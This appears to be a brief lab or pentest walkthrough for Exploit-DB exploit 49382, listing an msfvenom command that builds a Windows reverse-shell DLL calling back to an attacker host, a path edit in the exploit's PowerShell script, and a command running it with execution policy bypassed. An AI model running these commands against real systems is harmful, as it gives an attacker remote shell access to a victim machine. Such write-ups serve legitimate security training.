exploit 49382


Looking at the script we see the need to generate a reverse shell .dll payload. Then execute the .ps1 targeting the .dll.


```bash - kali
sudo msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=$KALI LPORT=445
```


Edit the .ps1 to target the location of the .dll.

```
#Example payload generated as follows # msfvenom -p windows/x64/shell_reverse_tcp â€”f dll -o shell.dll LHOST=eth0 LPORT=4444 
$PayloadFile = "C:\Users\tony\AppData\Local\Temp\shell.dl1"
```


Upload both, the dll and ps1 file to target.

```batch - windows
powershell.exe -ep bypass .\49382.ps1
```
